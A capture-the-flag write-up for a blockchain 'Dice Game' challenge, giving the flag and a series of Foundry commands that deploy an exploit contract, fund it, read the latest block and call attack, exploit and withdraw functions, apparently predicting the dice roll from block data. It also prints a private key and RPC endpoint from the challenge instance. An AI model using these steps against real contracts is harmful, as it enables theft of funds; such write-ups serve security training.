---
title: "Dice Game"
categories: Miscellaneous
tags: 
  - Blockchain
draft: false
completedDuringEvent: true
submitted: true
flags: flag: RECURSION{pr0vably_f41r_d1ce_g4me_w1th_smart_c0ntr4cts}
---
> This is a blockchain-based **dice game** that simulates traditional gambling mechanics using smart contracts. Players can start a game, place wagers, and roll virtual dice with outcomes ranging from 1 to 1000. The game is designed to be provably fair by utilizing a combination of user-generated and server-generated seeds to compute each roll deterministically.

by `ztz`

---

```bash
$ forge create --broadcast --rpc-url http://103.87.66.171:8545/k16a8f6i8r9i5n7z --private-key 0xb1a96be28556d6721d3a5e0eb5d4973f1a4ba3e0754b99f1d6dd85134d57680e ./src/Exploit.sol:Exploit --constructor-args 0xF17C373965C4e66c8eaD5E24B41ABaFeA37e8E83 0x1c4107E0C5AF7Ff7e5fF1D8aC02b7A19e7Cd6379

$ cast send --private-key 0xb1a96be28556d6721d3a5e0eb5d4973f1a4ba3e0754b99f1d6dd85134d57680e --value 16ether 0x4bd657ac6a6C8908AEc9EAD37860fAba25700Cda --rpc-url http://103.87.66.171:8545/k16a8f6i8r9i5n7z
$ cast send 0x4bd657ac6a6C8908AEc9EAD37860fAba25700Cda "attack()" --private-key 0xb1a96be28556d6721d3a5e0eb5d4973f1a4ba3e0754b99f1d6dd85134d57680e --rpc-url http://103.87.66.171:8545/k16a8f6i8r9i5n7z
$ cast block latest --rpc-url http://103.87.66.171:8545/k16a8f6i8r9i5n7z
$ cast send 0x4bd657ac6a6C8908AEc9EAD37860fAba25700Cda "exploit(uint256, uint256)" 6 1743917106 --private-key 0xb1a96be28556d6721d3a5e0eb5d4973f1a4ba3e0754b99f1d6dd85134d57680e --rpc-url http://103.87.66.171:8545/k16a8f6i8r9i5n7z
$ cast send 0x4bd657ac6a6C8908AEc9EAD37860fAba25700Cda "withdraw()" --private-key 0xb1a96be28556d6721d3a5e0eb5d4973f1a4ba3e0754b99f1d6dd85134d57680e --rpc-url http://103.87.66.171:8545/k16a8f6i8r9i5n7z
```
